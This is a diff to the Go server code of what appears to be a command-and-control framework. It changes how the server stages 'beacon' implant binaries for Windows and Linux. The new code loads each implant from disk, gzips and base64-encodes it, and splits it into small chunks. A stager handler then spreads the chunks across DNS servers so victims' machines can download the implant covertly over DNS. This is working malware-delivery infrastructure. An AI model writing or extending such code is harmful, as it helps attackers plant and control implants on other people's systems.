@@ -5,11 +5,14 @@ package main
 
 import (
 	"bytes"
+	"compress/gzip"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
 	"math/rand"
 	"net/http"
+	"os"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -1136,6 +1139,74 @@ type StagerInitResponse struct {
 	ChunkSize   int      `json:"chunk_size"`
 }
 
+// loadAndProcessClientBinary loads a client binary from disk and processes it for stager deployment
+// Returns: clientBinaryID, base64Data, totalChunks, error
+func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, string, int, error) {
+	// Determine client binary filename based on OS
+	var clientFilename string
+	if strings.ToLower(osType) == "windows" {
+		clientFilename = "beacon-windows"
+	} else {
+		clientFilename = "beacon-linux"
+	}
+
+	// Derive builds directory from database path (/opt/unkn0wnc2/master.db -> /opt/unkn0wnc2/builds)
+	dbDir := filepath.Dir(api.config.DatabasePath) // /opt/unkn0wnc2
+	buildsDir := filepath.Join(dbDir, "builds")
+
+	// Look for client builds matching OS
+	files, err := filepath.Glob(filepath.Join(buildsDir, clientFilename+"-*"))
+	if err != nil {
+		return "", "", 0, fmt.Errorf("failed to search builds directory: %w", err)
+	}
+
+	if len(files) == 0 {
+		return "", "", 0, fmt.Errorf("no client binary found for %s/%s in %s", osType, arch, buildsDir)
+	}
+
+	// Find most recent file (assume files are sorted by timestamp in filename)
+	clientPath := files[len(files)-1] // Get last (most recent) file
+
+	fmt.Printf("[Master] Loading client binary: %s\n", clientPath)
+
+	// Read client binary
+	clientData, err := os.ReadFile(clientPath)
+	if err != nil {
+		return "", "", 0, fmt.Errorf("failed to read client binary: %w", err)
+	}
+
+	fmt.Printf("[Master] Loaded client binary: %d bytes\n", len(clientData))
+
+	// Compress with gzip
+	var compressedBuf bytes.Buffer
+	gzWriter := gzip.NewWriter(&compressedBuf)
+	_, err = gzWriter.Write(clientData)
+	if err != nil {
+		return "", "", 0, fmt.Errorf("failed to compress client: %w", err)
+	}
+	gzWriter.Close()
+
+	compressed := compressedBuf.Bytes()
+	fmt.Printf("[Master] Compressed: %d bytes -> %d bytes (%.1f%% reduction)\n",
+		len(clientData), len(compressed),
+		100.0*(1.0-float64(len(compressed))/float64(len(clientData))))
+
+	// Base64 encode
+	base64Data := base64.StdEncoding.EncodeToString(compressed)
+	fmt.Printf("[Master] Base64 encoded: %d bytes\n", len(base64Data))
+
+	// Calculate total chunks
+	const chunkSize = 403
+	totalChunks := (len(base64Data) + chunkSize - 1) / chunkSize
+
+	fmt.Printf("[Master] Will split into %d chunks of %d bytes each\n", totalChunks, chunkSize)
+
+	// Use filename as ID
+	clientBinaryID := filepath.Base(clientPath)
+
+	return clientBinaryID, base64Data, totalChunks, nil
+}
+
 // handleStagerInit processes stager initialization (STG message forwarded from DNS server)
 func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 	var req StagerInitRequest
@@ -1154,37 +1225,25 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 			req.StagerIP, req.OS, req.Arch, dnsServerID)
 	}
 
-	// Find matching client binary
-	binaries, err := api.db.GetClientBinaries()
-	if err != nil || len(binaries) == 0 {
-		api.sendError(w, http.StatusNotFound, "no client binaries available")
-		return
-	}
-
-	// Find binary matching OS/Arch
-	var clientBinary map[string]interface{}
-	for _, binary := range binaries {
-		if strings.EqualFold(binary["os"].(string), req.OS) {
-			clientBinary = binary
-			break
+	// Load and process client binary from filesystem
+	clientBinaryID, base64Data, totalChunks, err := api.loadAndProcessClientBinary(req.OS, req.Arch)
+	if err != nil {
+		api.sendError(w, http.StatusNotFound, fmt.Sprintf("failed to load client binary: %v", err))
+		if api.config.Debug {
+			fmt.Printf("[API] Failed to load client binary: %v\n", err)
 		}
-	}
-
-	if clientBinary == nil {
-		api.sendError(w, http.StatusNotFound, fmt.Sprintf("no client binary for %s/%s", req.OS, req.Arch))
 		return
 	}
 
 	// Create stager session
 	sessionID := fmt.Sprintf("stg_%d_%d", time.Now().UnixNano(), rand.Intn(10000))
-	totalChunks := clientBinary["total_chunks"].(int)
 
 	err = api.db.CreateStagerSession(
 		sessionID,
 		req.StagerIP,
 		req.OS,
 		req.Arch,
-		clientBinary["id"].(string),
+		clientBinaryID,
 		dnsServerID,
 		totalChunks,
 	)
@@ -1219,9 +1278,8 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Split base64 data into chunks
-	base64Data := clientBinary["base64_data"].(string)
-	chunkSize := clientBinary["chunk_size"].(int)
+	// Split base64 data into chunks (already done by loadAndProcessClientBinary)
+	const chunkSize = 403
 	var chunks []string
 	for i := 0; i < len(base64Data); i += chunkSize {
 		end := i + chunkSize
@@ -1232,7 +1290,7 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Assign chunks to DNS servers (round-robin)
-	err = api.db.AssignStagerChunks(sessionID, clientBinary["id"].(string), chunks, dnsServerIDs)
+	err = api.db.AssignStagerChunks(sessionID, clientBinaryID, chunks, dnsServerIDs)
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, "failed to assign chunks")
 		if api.config.Debug {
@@ -1251,7 +1309,7 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 		SessionID:   sessionID,
 		TotalChunks: totalChunks,
 		DNSDomains:  dnsDomains,
-		ChunkSize:   chunkSize,
+		ChunkSize:   403,
 	}
 
 	api.sendJSON(w, response)
